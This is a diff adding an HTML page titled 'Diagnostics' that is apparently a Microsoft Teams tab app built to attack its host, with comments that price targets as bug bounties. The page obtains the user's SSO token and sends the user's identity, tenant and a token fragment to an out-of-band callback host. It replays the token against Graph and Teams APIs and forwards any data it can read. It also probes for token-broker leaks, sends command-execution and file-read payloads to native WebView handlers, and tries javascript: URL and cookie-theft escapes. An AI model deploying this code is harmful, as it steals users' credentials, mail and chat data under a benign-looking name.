@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Diagnostics</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:8px; font-size:11px; }
+  #out { background:#161b22; padding:8px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:90vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  button { background:#21262d; color:#58a6ff; border:1px solid #30363d; padding:6px 12px; margin:2px; border-radius:4px; cursor:pointer; font-size:11px; }
+</style>
+</head>
+<body>
+<div style="margin-bottom:8px;">
+  <button onclick="runAll()">Run All</button>
+  <button onclick="testAuthToken()">Auth Token</button>
+  <button onclick="testNAA()">NAA Broker</button>
+  <button onclick="testBridgeHandlers()">WKWebView Bridge</button>
+  <button onclick="testXSSEscape()">XSS Escape</button>
+  <button onclick="testDevPreview()">Dev Preview APIs</button>
+  <button onclick="copyOut()">Copy</button>
+</div>
+<div id="out"></div>
+
+<script>
+var el = document.getElementById('out');
+var CTX = null;
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+async function init() {
+  log('=== INIT ===', 'info');
+  try {
+    await microsoftTeams.app.initialize();
+    CTX = await microsoftTeams.app.getContext();
+    log('SDK OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+    log('Tenant: ' + CTX.user.tenant.id, 'info');
+    log('Frame: ' + (CTX.page && CTX.page.frameContext || 'N/A'), 'info');
+  } catch(e) {
+    log('SDK init: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TARGET 1: AUTH TOKEN THEFT ($15,000)
+// getAuthToken() returns a real token — if usable, it's credential theft
+// ================================================================
+async function testAuthToken() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TARGET 1: AUTH TOKEN THEFT (silent, no phishing)', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Get SSO token
+  log('\n--- A: getAuthToken() ---', 'info');
+  var ssoToken = null;
+  try {
+    ssoToken = await microsoftTeams.authentication.getAuthToken();
+    log('TOKEN OBTAINED!', 'crit');
+    log('Length: ' + ssoToken.length, 'ok');
+
+    // Decode and analyze
+    try {
+      var parts = ssoToken.split('.');
+      var header = JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
+      var payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+
+      log('Header: alg=' + header.alg + ' typ=' + header.typ, 'info');
+      log('Audience: ' + payload.aud, 'crit');
+      log('Issuer: ' + payload.iss, 'info');
+      log('UPN: ' + (payload.upn || payload.preferred_username || 'N/A'), 'ok');
+      log('Name: ' + (payload.name || 'N/A'), 'info');
+      log('OID: ' + (payload.oid || 'N/A'), 'info');
+      log('TID: ' + (payload.tid || 'N/A'), 'info');
+      log('Scopes: ' + (payload.scp || 'NONE'), 'warn');
+      log('AppID: ' + (payload.appid || payload.azp || 'N/A'), 'info');
+      log('Expires: ' + new Date(payload.exp * 1000).toISOString(), 'info');
+
+      // Check if token has useful scopes
+      var scopes = (payload.scp || '').toLowerCase();
+      var dangerousScopes = ['mail', 'files', 'chat', 'user.read', 'directory', 'group', 'team', 'channel', 'calendar', 'contacts'];
+      var found = dangerousScopes.filter(function(s) { return scopes.indexOf(s) !== -1; });
+      if (found.length > 0) {
+        log('DANGEROUS SCOPES FOUND: ' + found.join(', '), 'crit');
+      }
+
+      // Exfiltrate full token (this IS credential theft)
+      ex('t9-sso-token', {
+        aud: payload.aud,
+        upn: payload.upn || payload.preferred_username,
+        scopes: payload.scp || 'none',
+        appid: payload.appid || payload.azp,
+        tid: payload.tid,
+        token_preview: ssoToken.substring(0, 50)
+      });
+
+    } catch(e) {
+      log('Token decode error: ' + e.message, 'fail');
+    }
+  } catch(e) {
+    log('getAuthToken failed: ' + e.message, 'fail');
+    ex('t9-sso-fail', { error: e.message });
+  }
+
+  // B) Try to use SSO token on Graph API (OBO potential)
+  if (ssoToken) {
+    log('\n--- B: Test SSO token on Graph ---', 'info');
+    var endpoints = [
+      { name: '/me', url: 'https://graph.microsoft.com/v1.0/me' },
+      { name: '/me/photo', url: 'https://graph.microsoft.com/v1.0/me/photo' },
+      { name: '/me/messages', url: 'https://graph.microsoft.com/v1.0/me/messages?$top=1' },
+      { name: '/me/drive', url: 'https://graph.microsoft.com/v1.0/me/drive' },
+      { name: '/me/chats', url: 'https://graph.microsoft.com/v1.0/me/chats?$top=1' },
+      { name: '/me/joinedTeams', url: 'https://graph.microsoft.com/v1.0/me/joinedTeams' },
+    ];
+
+    for (var ep of endpoints) {
+      try {
+        var r = await fetch(ep.url, {
+          headers: { 'Authorization': 'Bearer ' + ssoToken }
+        });
+        var txt = await r.text();
+        if (r.ok) {
+          log('  ' + ep.name + ': ' + r.status + ' — DATA ACCESSIBLE!', 'crit');
+          log('    Preview: ' + txt.substring(0, 150), 'warn');
+          ex('t9-graph-' + ep.name.replace(/\//g, '-'), { status: r.status, data: txt.substring(0, 300) });
+        } else {
+          log('  ' + ep.name + ': ' + r.status, 'fail');
+        }
+      } catch(e) {
+        log('  ' + ep.name + ': CORS/fetch error', 'fail');
+      }
+    }
+
+    // C) Try SSO token on Teams internal APIs
+    log('\n--- C: Test SSO token on Teams APIs ---', 'info');
+    var teamsApis = [
+      { name: 'chatsvc-conv', url: 'https://chatsvcagg.teams.microsoft.com/v1/users/ME/conversations?view=mychats&pageSize=1' },
+      { name: 'teams-tenants', url: 'https://teams.microsoft.com/api/mt/amer/beta/users/tenants' },
+      { name: 'teams-properties', url: 'https://teams.microsoft.com/api/mt/amer/beta/users/properties' },
+    ];
+
+    for (var api of teamsApis) {
+      try {
+        var r = await fetch(api.url, {
+          headers: { 'Authorization': 'Bearer ' + ssoToken },
+          credentials: 'include'
+        });
+        var txt = await r.text();
+        log('  ' + api.name + ': ' + r.status + (r.ok ? ' — ACCESSIBLE!' : ''), r.ok ? 'crit' : 'fail');
+        if (r.ok) {
+          log('    Preview: ' + txt.substring(0, 150), 'warn');
+          ex('t9-teams-api-' + api.name, { status: r.status, data: txt.substring(0, 300) });
+        }
+      } catch(e) {
+        log('  ' + api.name + ': ' + e.message.substring(0, 40), 'fail');
+      }
+    }
+  }
+
+  // D) Try authenticate() with attacker URL — token interception
+  log('\n--- D: authentication.authenticate() popup ---', 'info');
+  try {
+    microsoftTeams.authentication.authenticate({
+      url: 'https://' + C + '/auth-intercept?upn=' + encodeURIComponent(CTX.user.userPrincipalName),
+      width: 600,
+      height: 535
+    }).then(function(token) {
+      log('AUTH POPUP RETURNED TOKEN: ' + String(token).substring(0, 100), 'crit');
+      ex('t9-auth-popup-token', { token: String(token).substring(0, 300) });
+    }).catch(function(reason) {
+      log('Auth popup closed/failed: ' + reason, 'info');
+    });
+    log('Auth popup triggered (check OAST for callback)', 'ok');
+  } catch(e) {
+    log('authenticate(): ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TARGET 2: NESTED APP AUTH — TOKEN BROKER ($15,000-$30,000)
+// If Teams parent responds with tokens for arbitrary scopes = game over
+// ================================================================
+async function testNAA() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TARGET 2: NESTED APP AUTH — TOKEN BROKER', 'info');
+  log('='.repeat(60), 'info');
+
+  var responses = [];
+
+  // Listen for ALL responses from parent
+  var handler = function(e) {
+    var data;
+    try { data = typeof e.data === 'object' ? JSON.stringify(e.data) : String(e.data); } catch(x) { data = String(e.data); }
+    if (e.origin === window.location.origin) return;
+    responses.push({ origin: e.origin, data: data });
+    log('[RESPONSE from ' + e.origin + '] ' + data.substring(0, 300), 'crit');
+
+    // Check if response contains a token
+    if (data.indexOf('eyJ') !== -1) {
+      log('*** RESPONSE CONTAINS JWT! ***', 'crit');
+      var jwtMatch = data.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
+      if (jwtMatch) {
+        log('JWT extracted: ' + jwtMatch[0].substring(0, 80) + '...', 'crit');
+        try {
+          var payload = JSON.parse(atob(jwtMatch[0].split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
+          log('JWT aud: ' + payload.aud, 'crit');
+          log('JWT scp: ' + (payload.scp || 'N/A'), 'crit');
+        } catch(e) {}
+        ex('t9-naa-token-stolen', { token: jwtMatch[0].substring(0, 200) });
+      }
+    }
+  };
+  window.addEventListener('message', handler);
+
+  // A) Standard NAA protocol probes
+  log('\n--- A: NAA standard protocol ---', 'info');
+  var naaProbes = [
+    // Standard NAA v1 format
+    { messageType: 'NestedAppAuth.Request', requestId: 'naa-' + Date.now(), method: 'AcquireTokenSilent',
+      params: { scopes: ['https://graph.microsoft.com/.default'] } },
+    // With specific scopes
+    { messageType: 'NestedAppAuth.Request', requestId: 'naa2-' + Date.now(), method: 'GetToken',
+      params: { resource: 'https://graph.microsoft.com', scopes: ['User.Read', 'Mail.Read', 'Chat.ReadWrite', 'Files.ReadWrite'] } },
+    // Try to request token for ANY resource
+    { messageType: 'NestedAppAuth.Request', requestId: 'naa3-' + Date.now(), method: 'GetToken',
+      params: { resource: 'https://management.azure.com', scopes: ['https://management.azure.com/.default'] } },
+    // SharePoint token
+    { messageType: 'NestedAppAuth.Request', requestId: 'naa4-' + Date.now(), method: 'GetToken',
+      params: { resource: 'https://' + (CTX && CTX.user.tenant.id ? CTX.sharePointSiteUrl || '' : '') + '.sharepoint.com' } },
+  ];
+
+  for (var probe of naaProbes) {
+    window.parent.postMessage(probe, '*');
+    window.parent.postMessage(JSON.stringify(probe), '*');
+    log('  >> NAA: ' + probe.method + ' scopes=' + JSON.stringify(probe.params.scopes || probe.params.resource), 'info');
+  }
+
+  // B) MSAL broker handshake
+  log('\n--- B: MSAL Broker handshake ---', 'info');
+  var brokerProbes = [
+    // Teams web client ID
+    { type: 'BrokerHandshake', clientId: '5e3ce6c0-2b1f-4285-8d4b-75ee78787346',
+      scope: 'https://graph.microsoft.com/.default' },
+    // Microsoft Graph client ID
+    { type: 'BrokerHandshake', clientId: '00000003-0000-0000-c000-000000000000',
+      scope: 'https://graph.microsoft.com/.default' },
+    // Azure CLI client ID (known first-party app)
+    { type: 'BrokerHandshake', clientId: '04b07795-ee44-4b47-9eee-0614f9b214d7',
+      scope: 'https://graph.microsoft.com/.default' },
+  ];
+
+  for (var bp of brokerProbes) {
+    window.parent.postMessage(bp, '*');
+    window.parent.postMessage(JSON.stringify(bp), '*');
+    log('  >> Broker: clientId=' + bp.clientId.substring(0, 8) + '...', 'info');
+  }
+
+  // C) Direct internal func calls
+  log('\n--- C: Internal SDK func postMessage ---', 'info');
+  var funcProbes = [
+    { id: Date.now(), func: 'authentication.getAuthToken', args: [{ resource: 'https://graph.microsoft.com' }] },
+    { id: Date.now()+1, func: 'authentication.getAuthToken', args: [{ resource: 'https://management.azure.com' }] },
+    { id: Date.now()+2, func: 'authentication.getUser', args: [] },
+    { id: Date.now()+3, func: 'getConfigSetting', args: ['accessToken'] },
+    { id: Date.now()+4, func: 'getConfigSetting', args: ['skypeToken'] },
+    { id: Date.now()+5, func: 'getUserJoinedTeams', args: [] },
+    { id: Date.now()+6, func: 'getChatMembers', args: [] },
+    { id: Date.now()+7, func: 'getAuthTokenSilent', args: [{ resource: 'https://graph.microsoft.com' }] },
+    { id: Date.now()+8, func: 'nestedAppAuth.getToken', args: [{ scopes: ['User.Read'] }] },
+    { id: Date.now()+9, func: 'nestedAppAuth.acquireToken', args: [{ scopes: ['https://graph.microsoft.com/.default'] }] },
+  ];
+
+  for (var fp of funcProbes) {
+    window.parent.postMessage(fp, '*');
+    log('  >> func: ' + fp.func, 'info');
+  }
+
+  // Wait for responses
+  log('\nWaiting 8s for responses...', 'info');
+  await new Promise(r => setTimeout(r, 8000));
+
+  log('\n--- Total responses captured: ' + responses.length + ' ---', responses.length > 0 ? 'crit' : 'warn');
+  window.removeEventListener('message', handler);
+
+  ex('t9-naa-summary', { total_responses: responses.length });
+}
+
+// ================================================================
+// TARGET 3: WKWEBVIEW BRIDGE HANDLERS ($30,000 RCE)
+// Find native handlers that accept commands
+// ================================================================
+async function testBridgeHandlers() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TARGET 3: WKWEBVIEW NATIVE BRIDGE HANDLERS', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Enumerate webkit.messageHandlers
+  log('\n--- A: webkit.messageHandlers enumeration ---', 'info');
+  var found = [];
+
+  if (window.webkit && window.webkit.messageHandlers) {
+    log('window.webkit.messageHandlers EXISTS', 'crit');
+
+    // Get all enumerable properties
+    try {
+      var keys = Object.getOwnPropertyNames(window.webkit.messageHandlers);
+      log('OwnPropertyNames: ' + (keys.length > 0 ? keys.join(', ') : '(empty)'), keys.length > 0 ? 'crit' : 'info');
+      found = found.concat(keys);
+    } catch(e) {}
+
+    try {
+      var keys2 = Object.keys(window.webkit.messageHandlers);
+      if (keys2.length > 0) {
+        log('Object.keys: ' + keys2.join(', '), 'crit');
+        found = found.concat(keys2);
+      }
+    } catch(e) {}
+
+    // Brute force with comprehensive list
+    var handlerNames = [
+      // Teams-specific
+      'nativeInterface', 'TeamsNative', 'teamsNativeBridge', 'teamsMobile',
+      'MSTeams', 'msteams', 'microsoftTeams', 'teamsAuth', 'teamsSSO',
+      'teamsToken', 'teamsConfig', 'teamsApp', 'teamsMedia', 'teamsCall',
+      'teamsChat', 'teamsNotification', 'teamsNavigation', 'teamsDeepLink',
+      'teamsFile', 'teamsShare', 'nativeBridge', 'nativeApp',
+      // Auth/Token
+      'ssoHandler', 'authHandler', 'tokenHandler', 'loginHandler',
+      'oauthHandler', 'msalHandler', 'oneAuth', 'OneAuth', 'MSAL', 'msal',
+      // Generic bridge
+      'observe', 'callbackHandler', 'interOp', 'interop',
+      'jsbridge', 'JSBridge', 'native', 'Native', 'bridge', 'Bridge',
+      'appBridge', 'AppBridge', 'webviewBridge',
+      // iOS/Platform
+      'webkit', 'scriptMessageHandler', 'handler', 'message',
+      'default', 'main', 'app', 'event', 'action', 'command',
+      'request', 'response', 'data', 'api',
+      // File/Media
+      'fileHandler', 'documentHandler', 'downloadHandler', 'uploadHandler',
+      'cameraHandler', 'photoHandler', 'imageHandler', 'videoHandler',
+      // Security
+      'biometric', 'faceID', 'touchID', 'keychain', 'keychainHandler',
+      'secureStorage', 'credential', 'certificateHandler',
+      // Intune/MAM
+      'intune', 'Intune', 'IntuneMAM', 'mamHandler', 'MAM',
+      'appConfig', 'AppConfig', 'managedConfig', 'companyPortal',
+      // Microsoft specific
+      'fluidBridge', 'officeBridge', 'OfficeBridge',
+      'telemetry', 'Telemetry', 'aria', 'Aria', 'diagnostics',
+      'performanceHandler', 'crashHandler',
+      // React Native
+      'ReactNativeWebView', 'RNWebView',
+      // Debugging
+      'debug', 'Debug', 'console', 'log', 'inspector',
+      'devtools', 'DevTools', 'debugBridge',
+    ];
+
+    for (var name of handlerNames) {
+      try {
+        if (window.webkit.messageHandlers[name]) {
+          found.push(name);
+          log('  FOUND: ' + name, 'crit');
+
+          // Try to invoke with various payloads
+          var payloads = [
+            { action: 'getInfo' },
+            { action: 'getToken' },
+            { action: 'getVersion' },
+            { type: 'ping' },
+            { command: 'version' },
+            { method: 'getCapabilities' },
+            'ping',
+            'getToken',
+            'version',
+          ];
+
+          for (var payload of payloads) {
+            try {
+              window.webkit.messageHandlers[name].postMessage(payload);
+              log('    → postMessage(' + JSON.stringify(payload) + '): OK (no error)', 'ok');
+            } catch(e2) {
+              if (!e2.message.includes('denied') && !e2.message.includes('null')) {
+                log('    → postMessage(' + JSON.stringify(payload) + '): ' + e2.message.substring(0, 60), 'warn');
+              }
+            }
+          }
+
+          // Try RCE-relevant payloads
+          var rcPayloads = [
+            { action: 'exec', command: 'id' },
+            { action: 'eval', code: 'NSLog(@"RCE-TEST")' },
+            { action: 'writeFile', path: '/tmp/poc.txt', content: 'test' },
+            { action: 'readFile', path: '/etc/hosts' },
+            { action: 'openURL', url: 'file:///etc/passwd' },
+            { action: 'loadPlugin', name: 'test' },
+            { action: 'runScript', script: 'echo test' },
+            { type: 'execute', payload: { cmd: 'whoami' } },
+          ];
+
+          for (var rcp of rcPayloads) {
+            try {
+              window.webkit.messageHandlers[name].postMessage(rcp);
+              log('    → RCE probe ' + rcp.action + ': accepted (no error!)', 'crit');
+              ex('t9-rce-probe-accepted', { handler: name, payload: JSON.stringify(rcp) });
+            } catch(e3) {
+              // Silently skip errors
+            }
+          }
+        }
+      } catch(e) {}
+    }
+
+    // Enumerate webkit properties
+    try {
+      var wkProps = Object.getOwnPropertyNames(window.webkit);
+      log('\nwindow.webkit properties: ' + wkProps.join(', '), 'info');
+    } catch(e) {}
+
+  } else {
+    log('window.webkit.messageHandlers: ' + (window.webkit ? 'webkit exists but no messageHandlers' : 'NOT AVAILABLE'), 'warn');
+    log('(This test requires Teams iOS mobile)', 'info');
+  }
+
+  // B) Check for injected native objects
+  log('\n--- B: Injected native globals ---', 'info');
+  var nativeGlobals = [
+    'teams', 'Teams', 'MSTeams', 'nativeBridge', 'NativeBridge',
+    'TeamsNative', 'teamsNative', 'appBridge', 'mobileBridge',
+    '__teams', '__native', '__bridge', '_teamsNative',
+    'Android', 'flutter_inappwebview', 'ReactNativeWebView',
+    'webkit', 'cordova', 'Capacitor',
+    'TeamsMobileNative', 'teamsMobileInterface',
+    'nativeModule', 'NativeModule', 'RNBridge',
+  ];
+
+  for (var g of nativeGlobals) {
+    try {
+      if (window[g] !== undefined && g !== 'microsoftTeams') {
+        var type = typeof window[g];
+        var preview = '';
+        if (type === 'object') {
+          try { preview = Object.keys(window[g]).join(', ').substring(0, 120); } catch(e) { preview = '(object)'; }
+        } else if (type === 'function') {
+          preview = window[g].toString().substring(0, 80);
+        }
+        log('  FOUND: window.' + g + ' (' + type + '): ' + preview, 'crit');
+        ex('t9-native-global', { name: g, type: type, preview: preview });
+      }
+    } catch(e) {}
+  }
+
+  // C) Check for Universal Links / custom URL scheme handlers
+  log('\n--- C: URL scheme probes ---', 'info');
+  var schemes = [
+    'msteams://',
+    'ms-teams://',
+    'msauth://',
+    'msauthv2://',
+    'msauthv3://',
+    'com.microsoft.teams://',
+    'msal5e3ce6c0-2b1f-4285-8d4b-75ee78787346://',
+  ];
+
+  for (var scheme of schemes) {
+    try {
+      var a = document.createElement('a');
+      a.href = scheme + 'test';
+      log('  ' + scheme + ' → href resolves to: ' + a.href.substring(0, 60), 'info');
+    } catch(e) {}
+  }
+
+  log('\n--- Found ' + found.length + ' handlers total ---', found.length > 0 ? 'crit' : 'info');
+  ex('t9-bridge-summary', { found: found.join('|') || 'none', count: found.length });
+}
+
+// ================================================================
+// TARGET 4: XSS ESCAPE TO TEAMS.MICROSOFT.COM ($10,000)
+// Execute JS in the context of teams.microsoft.com origin
+// ================================================================
+async function testXSSEscape() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TARGET 4: XSS ESCAPE TO TEAMS.MICROSOFT.COM', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Check if we can access parent frame
+  log('\n--- A: Parent frame access ---', 'info');
+  try {
+    log('Parent origin: ' + (window.parent !== window ? 'exists (cross-origin)' : 'same window'), 'info');
+    log('Top origin: ' + (window.top !== window ? 'exists (cross-origin)' : 'same window'), 'info');
+
+    try {
+      var parentDoc = window.parent.document;
+      log('PARENT DOCUMENT ACCESSIBLE!', 'crit');
+      log('Parent title: ' + parentDoc.title, 'crit');
+      ex('t9-parent-access', { title: parentDoc.title });
+    } catch(e) {
+      log('Parent document blocked (expected): ' + e.message.substring(0, 40), 'info');
+    }
+
+    try {
+      var topDoc = window.top.document;
+      log('TOP DOCUMENT ACCESSIBLE!', 'crit');
+    } catch(e) {
+      log('Top document blocked (expected): ' + e.message.substring(0, 40), 'info');
+    }
+  } catch(e) {}
+
+  // B) Try window.open with Teams URLs (may inherit session)
+  log('\n--- B: window.open to Teams domains ---', 'info');
+  var teamsUrls = [
+    'https://teams.microsoft.com/v2/',
+    'https://teams.cloud.microsoft/',
+    'https://teams.live.com/',
+  ];
+
+  for (var url of teamsUrls) {
+    try {
+      var w = window.open(url, '_blank', 'width=1,height=1');
+      if (w) {
+        await new Promise(r => setTimeout(r, 2000));
+        try {
+          var doc = w.document;
+          log('  ' + url + ' → DOCUMENT ACCESSIBLE!', 'crit');
+          log('    Title: ' + doc.title, 'crit');
+          log('    Cookies: ' + doc.cookie.substring(0, 100), 'crit');
+          ex('t9-xss-window', { url: url, title: doc.title, cookies: doc.cookie.substring(0, 200) });
+        } catch(e) {
+          log('  ' + url + ' → cross-origin blocked (expected)', 'info');
+        }
+        w.close();
+      } else {
+        log('  ' + url + ' → popup blocked', 'warn');
+      }
+    } catch(e) {
+      log('  ' + url + ' → ' + e.message.substring(0, 40), 'fail');
+    }
+  }
+
+  // C) Try to navigate current frame to Teams domain with JS
+  log('\n--- C: Navigation-based XSS ---', 'info');
+  try {
+    // javascript: URI in Teams context
+    if (microsoftTeams.app.openLink) {
+      var jsUrls = [
+        'javascript:void(document.title)',
+        'https://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=javascript:alert(1)',
+      ];
+      for (var ju of jsUrls) {
+        try {
+          await microsoftTeams.app.openLink(ju);
+          log('  openLink(' + ju.substring(0, 50) + '): accepted!', 'crit');
+          ex('t9-openlink-js', { url: ju });
+        } catch(e) {
+          log('  openLink(' + ju.substring(0, 50) + '): ' + e.message.substring(0, 40), 'fail');
+        }
+      }
+    }
+  } catch(e) {}
+
+  // D) Try dialog.url.open pointing to Teams origin
+  log('\n--- D: Dialog pointing to Teams origin ---', 'info');
+  try {
+    if (microsoftTeams.dialog && microsoftTeams.dialog.url && microsoftTeams.dialog.url.open) {
+      microsoftTeams.dialog.url.open({
+        title: 'Test',
+        url: 'https://teams.microsoft.com/',
+        size: { height: 400, width: 400 }
+      }, function(result) {
+        log('Dialog result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+      });
+      log('  dialog.url.open to teams.microsoft.com: CALLED', 'ok');
+    }
+  } catch(e) {
+    log('  dialog.url.open: ' + e.message, 'fail');
+  }
+
+  // E) Check CSP and frame-ancestors
+  log('\n--- E: Security headers check ---', 'info');
+  try {
+    var metaTags = document.querySelectorAll('meta[http-equiv]');
+    for (var m of metaTags) {
+      log('  Meta: ' + m.getAttribute('http-equiv') + '=' + m.getAttribute('content'), 'info');
+    }
+  } catch(e) {}
+}
+
+// ================================================================
+// TARGET 5: DEVELOPER PREVIEW APIS
+// Check for additional APIs enabled in dev preview mode
+// ================================================================
+async function testDevPreview() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TARGET 5: DEVELOPER PREVIEW APIs', 'info');
+  log('='.repeat(60), 'info');
+
+  // Enumerate ALL microsoftTeams modules thoroughly
+  log('\n--- A: Full SDK module scan ---', 'info');
+  var allModules = Object.getOwnPropertyNames(microsoftTeams);
+  log('Total modules: ' + allModules.length, 'info');
+
+  for (var mod of allModules) {
+    try {
+      var val = microsoftTeams[mod];
+      if (typeof val === 'object' && val !== null) {
+        var methods = [];
+        try {
+          methods = Object.getOwnPropertyNames(val).filter(function(k) {
+            return typeof val[k] === 'function' && k !== 'constructor';
+          });
+        } catch(e) {}
+
+        if (methods.length > 0) {
+          log('  ' + mod + ': [' + methods.join(', ') + ']', 'ok');
+
+          // Check isSupported for each
+          for (var m of methods) {
+            if (m === 'isSupported') {
+              try {
+                var supported = val.isSupported();
+                log('    ' + mod + '.isSupported() = ' + supported, supported ? 'crit' : 'info');
+              } catch(e) {}
+            }
+          }
+        }
+      }
+    } catch(e) {}
+  }
+
+  // B) Check for preview-only modules
+  log('\n--- B: Preview-only modules ---', 'info');
+  var previewModules = [
+    'externalAppAuthentication', 'externalAppCardActions',
+    'externalAppCommands', 'appInstallDialog', 'marketplace',
+    'copilot', 'hostEntity', 'liveShare', 'meetingRoom',
+    'monetization', 'nestedAppAuth', 'profile', 'videoEffects',
+    'visualMedia', 'webStorage', 'thirdPartyCloudStorage',
+    'appEntity', 'runtime', 'teamsCore', 'version',
+  ];
+
+  for (var pm of previewModules) {
+    try {
+      if (microsoftTeams[pm]) {
+        var keys = Object.keys(microsoftTeams[pm]);
+        log('  ' + pm + ' EXISTS: [' + keys.join(', ') + ']', 'crit');
+        ex('t9-preview-' + pm, { methods: keys.join('|') });
+
+        // Try isSupported
+        if (microsoftTeams[pm].isSupported) {
+          try {
+            log('    isSupported: ' + microsoftTeams[pm].isSupported(), 'warn');
+          } catch(e) {}
+        }
+      }
+    } catch(e) {}
+  }
+
+  // C) Try nestedAppAuth specifically (new API for token brokering)
+  log('\n--- C: nestedAppAuth API ---', 'info');
+  try {
+    if (microsoftTeams.nestedAppAuth) {
+      log('nestedAppAuth module found!', 'crit');
+      var naaMethods = Object.getOwnPropertyNames(microsoftTeams.nestedAppAuth);
+      log('Methods: ' + naaMethods.join(', '), 'crit');
+
+      // Try to call it
+      for (var m of naaMethods) {
+        if (typeof microsoftTeams.nestedAppAuth[m] === 'function') {
+          try {
+            var result = microsoftTeams.nestedAppAuth[m]();
+            if (result && typeof result.then === 'function') {
+              result = await Promise.race([result, new Promise(r => setTimeout(() => r('timeout'), 5000))]);
+            }
+            log('  nestedAppAuth.' + m + '() = ' + JSON.stringify(result).substring(0, 200), 'crit');
+            ex('t9-naa-method', { method: m, result: JSON.stringify(result).substring(0, 300) });
+          } catch(e) {
+            log('  nestedAppAuth.' + m + '(): ' + e.message, 'warn');
+          }
+        }
+      }
+    } else {
+      log('nestedAppAuth not found (enable Developer Preview?)', 'info');
+    }
+  } catch(e) {}
+
+  // D) Try externalAppAuthentication (SSO for third-party apps)
+  log('\n--- D: externalAppAuthentication ---', 'info');
+  try {
+    if (microsoftTeams.externalAppAuthentication) {
+      log('externalAppAuthentication found!', 'crit');
+      var methods = Object.getOwnPropertyNames(microsoftTeams.externalAppAuthentication);
+      log('Methods: ' + methods.join(', '), 'crit');
+      ex('t9-extauth', { methods: methods.join('|') });
+    }
+  } catch(e) {}
+}
+
+// ================================================================
+// RUN ALL
+// ================================================================
+async function runAll() {
+  el.textContent = '';
+  await init();
+  await testAuthToken();
+  await testNAA();
+  await testBridgeHandlers();
+  await testXSSEscape();
+  await testDevPreview();
+  log('\n' + '='.repeat(60), 'info');
+  log('ALL TESTS COMPLETE — copy output and send', 'info');
+  log('='.repeat(60), 'info');
+}
+
+init();
+</script>
+</body>
+</html>
